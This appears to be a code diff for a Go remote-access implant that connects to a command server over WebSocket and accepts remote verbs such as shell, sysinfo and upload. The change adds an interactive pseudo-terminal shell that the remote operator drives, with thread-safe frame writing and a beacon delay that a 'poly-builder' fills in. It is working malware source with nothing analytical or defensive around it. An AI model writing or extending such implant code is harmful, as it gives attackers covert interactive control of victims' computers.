@@ -26,6 +26,7 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -42,7 +43,7 @@ const (
 	defShell   = "/bin/sh" // windows: computed at runtime
 	execLimit  = 120 * time.Second
 	maxDL      = 4 << 20 // 4 MiB download cap
-	reconnect  = 5 * time.Second
+	reconnect  = {{BEACON}} * time.Second // beacon delay, baked by poly-builder
 	wsGUID     = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
 )
 
@@ -208,6 +209,9 @@ func readFrame(rd *bufio.Reader) (int, []byte, error) {
 	return op, buf, nil // server->client frames are never masked
 }
 
+// pty goroutines stream output while the read loop dispatches — serialize writes
+var frameMu sync.Mutex
+
 func writeFrame(conn net.Conn, opcode int, payload []byte) error {
 	var hdr [10]byte
 	n := len(payload)
@@ -234,6 +238,8 @@ func writeFrame(conn net.Conn, opcode int, payload []byte) error {
 	for i, b := range payload {
 		out = append(out, b^mask[i%4])
 	}
+	frameMu.Lock()
+	defer frameMu.Unlock()
 	_, err := conn.Write(out)
 	return err
 }
@@ -244,6 +250,58 @@ func sendText(conn net.Conn, v interface{}) error {
 		return err
 	}
 	return writeFrame(conn, 1, b)
+}
+
+// ── interactive pty shell (cross-platform plumbing; linux specifics in
+// pty_linux.go / pty_stub.go so the implant compiles for every target) ─────────────────
+
+type ptySession struct {
+	master *os.File
+	child  *exec.Cmd
+	conn   net.Conn
+	once   sync.Once
+}
+
+var (
+	ptyMu     sync.Mutex
+	activePty *ptySession
+)
+
+func (p *ptySession) kill() {
+	p.once.Do(func() {
+		p.master.Close()
+		if p.child != nil && p.child.Process != nil {
+			p.child.Process.Kill()
+		}
+	})
+}
+
+func ptyTermSize(arg string) (uint16, uint16) {
+	cols, rows := 120, 32
+	if _, err := fmt.Sscanf(arg, "%d,%d", &cols, &rows); err != nil || cols <= 0 || rows <= 0 {
+		cols, rows = 120, 32
+	}
+	return uint16(cols), uint16(rows)
+}
+
+
+func ptyResult(id int64, out string) map[string]interface{} {
+	return map[string]interface{}{"id": id, "type": "result", "out": out}
+}
+
+
+func ptyIn(data string) {
+	ptyMu.Lock()
+	p := activePty
+	ptyMu.Unlock()
+	if p == nil {
+		return
+	}
+	raw, err := base64.StdEncoding.DecodeString(data)
+	if err != nil || len(raw) == 0 {
+		return
+	}
+	p.master.Write(raw)
 }
 
 // ── verb dispatch ──────────────────────────────────────────────────────
@@ -314,6 +372,14 @@ func dispatch(c *command, conn net.Conn) {
 	switch c.Cmd {
 	case "shell":
 		doShell(c.ID, c.Arg, conn)
+	case "pty_open":
+		ptyOpen(c.ID, c.Arg, conn)
+	case "pty_in":
+		ptyIn(c.Data)
+	case "pty_sz":
+		if err := ptySetSize(c.Arg); err != nil {
+			sendText(conn, ptyResult(c.ID, "pty_sz: "+err.Error()))
+		}
 	case "sysinfo":
 		doSysinfo(c.ID, conn)
 	case "upload":
@@ -342,6 +408,14 @@ func serveOnce() error {
 	if err != nil {
 		return err
 	}
+	defer func() {
+		ptyMu.Lock()
+		p := activePty
+		ptyMu.Unlock()
+		if p != nil {
+			p.kill()
+		}
+	}()
 	u, err := urlParse(wsURL)
 	if err != nil {
 		conn.Close()
